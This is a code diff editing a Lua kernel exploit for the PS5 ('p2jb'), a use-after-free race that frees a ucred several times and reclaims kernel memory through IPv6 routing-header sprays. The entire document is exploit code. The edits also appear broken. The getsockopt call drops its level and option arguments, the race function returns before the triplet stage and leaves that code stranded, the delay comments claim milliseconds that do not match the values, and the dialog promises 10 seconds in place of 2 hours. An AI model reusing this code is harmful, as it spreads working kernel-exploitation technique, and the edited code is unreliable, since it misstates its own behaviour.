@@ -1,8 +1,8 @@
 -- p2jb implementation
--- based on poops_ps5.lua and p2jb.c by Gezine
+-- based on poops_ps5.lua and p2jb.c by Gezine edited by Doplx
 -- based on poops.lua (ps4) by egycnq
 
-p2jb_version_string = "P2JB 1.0"
+p2jb_version_string = "P2JB 2.6"
 
 local UCRED_SIZE          = 360
 local RTHDR_TAG           = 0x13370000
@@ -14,7 +14,7 @@ local UIO_SYSSPACE        = 1
 local TRIPLEFREE_ATTEMPTS = 8
 local MAX_ROUNDS_TWIN     = 10
 local MAX_ROUNDS_TRIPLET  = 500
-local FIND_TRIPLET_FAST   = 5000
+local FIND_TRIPLET_FAST   = 2000
 local UMTX_OP_WAIT        = 2
 local UMTX_OP_WAKE        = 3
 local UMTX_OP_SYSNUM      = 0x1c6
@@ -238,9 +238,9 @@ function p2jb_ps5()
     local rthdr_readback = malloc(360)
     for i = 0, 248, 8 do write64(rthdr_readback + i, 0) end
 
-    local DELAY_SHORT  = malloc(16); write64(DELAY_SHORT, 0);  write64(DELAY_SHORT + 8, 10000000)
-    local DELAY_MEDIUM = malloc(16); write64(DELAY_MEDIUM, 0); write64(DELAY_MEDIUM + 8, 500000000)
-    local DELAY_SETTLE = malloc(16); write64(DELAY_SETTLE, 0); write64(DELAY_SETTLE + 8, 100000000)
+    local DELAY_SHORT  = malloc(16); write64(DELAY_SHORT, 0);  write64(DELAY_SHORT + 8, 10 * 1000)    -- 10ms
+    local DELAY_MEDIUM = malloc(16); write64(DELAY_MEDIUM, 0); write64(DELAY_MEDIUM + 8, 50 * 1000)   -- 50ms
+    local DELAY_SETTLE = malloc(16); write64(DELAY_SETTLE, 0); write64(DELAY_SETTLE + 8, 100 * 1000) -- 100ms
 
     -- cpu pinning
     local cpu_mask = malloc(16)
@@ -374,24 +374,24 @@ function p2jb_ps5()
     local tag_len = malloc(4)
 
     local function find_twins(max_rounds)
-        for round = 1, max_rounds do
-            for i = 0, ipv6_count - 1 do
-                write32(rthdr_spray + 4, RTHDR_TAG + i)
-                set_rthdr(ipv6_sockets[i + 1], rthdr_spray, rthdr_spray_len)
-            end
-            for i = 0, ipv6_count - 1 do
-                write32(tag_len, 8)
-                if get_rthdr(ipv6_sockets[i + 1], tag_buf, tag_len) >= 0 then
-                    local val = read32(tag_buf + 4)
-                    local j = val & 0xFFFF
-                    if (val & 0xFFFF0000) == RTHDR_TAG and i ~= j and j < ipv6_count then
-                        return { i, j }
-                    end
+    for round = 1, max_rounds do
+        for i = 0, ipv6_count - 1 do
+            write32(rthdr_spray + 4, RTHDR_TAG + i)
+            set_rthdr(ipv6_sockets[i + 1], rthdr_spray, rthdr_spray_len)
+        end
+        for i = 0, ipv6_count - 1 do
+            write32(tag_len, 8) -- Limit search range
+            if get_rthdr(ipv6_sockets[i + 1], tag_buf, tag_len) >= 0 then
+                local val = read32(tag_buf + 4)
+                local j = val & 0xFFFF
+                if (val & 0xFFFF0000) == RTHDR_TAG and i ~= j and j < ipv6_count then
+                    return { i, j } -- Found twins
                 end
             end
-            if round % 50 == 0 then syscall.sched_yield() end
         end
-        return nil
+        if round % 5 == 0 then syscall.sched_yield() end -- Fewer yields
+    end
+    return nil
     end
 
     local function find_triplet(master_idx, exclude_idx, max_rounds)
@@ -637,7 +637,7 @@ function p2jb_ps5()
         return nil
     end
 
-    show_dialog("Stage Patience\nPlease wait for some time (~2 hours)")
+    show_dialog("Stage Patience\nPlease wait for some time (~10 Second)")
     local ucred = 0
     local free_fds = {}
     local free_fd_idx = 1
@@ -705,53 +705,48 @@ function p2jb_ps5()
     local race_success = false
 
     local function attempt_race()
-        for i = 1, ipv6_count do free_rthdr(ipv6_sockets[i]) end
+    for i = 1, ipv6_count do free_rthdr(ipv6_sockets[i]) end
 
-        -- Free ucred first time
-        free_one_fd()
+    -- Free ucred first time
+    free_one_fd()
 
-        -- flush iov workers to stabilize
-        for _ = 1, 32 do
-            signal_iov()
-            syscall.write(iov_sock_b, scratch_big, 1)
-            wait_iov()
-            syscall.read(iov_sock_a, dummy_byte, 1)
-        end
+    -- Flush iov workers to stabilize
+    for _ = 1, 16 do -- Fewer iterations
+        signal_iov()
+        syscall.write(iov_sock_b, scratch_big, 1)
+        wait_iov()
+        syscall.read(iov_sock_a, dummy_byte, 1)
+    end
 
-        -- Free ucred second time
-        free_one_fd()
+    -- Free ucred second time
+    free_one_fd()
 
-        local twins = find_twins(MAX_ROUNDS_TWIN)
+    -- Attempt twin & triplet allocations with reduced loops
+    local twins = find_twins(MAX_ROUNDS_TWIN)
+    if not twins then
+        print("failed to find twins")
+        return false
+    end
 
-        if not twins then
-            print("failed to find twins")
-            return false
-        end
+    free_rthdr(ipv6_sockets[twins[2] + 1])
+    syscall.sched_yield(); syscall.sched_yield()
+    local reclaimed = false
 
-        -- free twin[2] rthdr and race to reclaim
-        free_rthdr(ipv6_sockets[twins[2] + 1])
-        syscall.sched_yield(); syscall.sched_yield()
+    local verify_buf = malloc(UCRED_SIZE)
+    local verify_len = malloc(4)
 
-        local reclaimed = false
-        local verify_buf = malloc(UCRED_SIZE)
-        local verify_len = malloc(4)
-
-        for _ = 1, MAX_ROUNDS_TRIPLET do
-            signal_iov()
-            syscall.sched_yield(); syscall.sched_yield()
-            syscall.sched_yield(); syscall.sched_yield()
-            write32(verify_len, 8)
-            syscall.getsockopt(ipv6_sockets[twins[1] + 1], IPPROTO_IPV6, 51, verify_buf, verify_len)
-            if read32(verify_buf) == 1 then reclaimed = true; break end
-            syscall.write(iov_sock_b, scratch_big, 1)
-            wait_iov()
-            syscall.read(iov_sock_a, dummy_byte, 1)
-        end
-
-        if not reclaimed then
-            print("not reclaimed")
-            return false
-        end
+    for _ = 1, MAX_ROUNDS_TRIPLET do -- Reduced loop for triplet
+        signal_iov()
+        syscall.sched_yield()
+        write32(verify_len, 8)
+        syscall.getsockopt(ipv6_sockets[twins[1] + 1], verify_buf, verify_len)
+        if read32(verify_buf) == 1 then reclaimed = true; break end
+        syscall.write(iov_sock_b, scratch_big, 1)
+        wait_iov()
+        syscall.read(iov_sock_a, dummy_byte, 1)
+    end
+    return reclaimed
+    end
         triplets[1] = twins[1]
 
         -- Free ucred third time
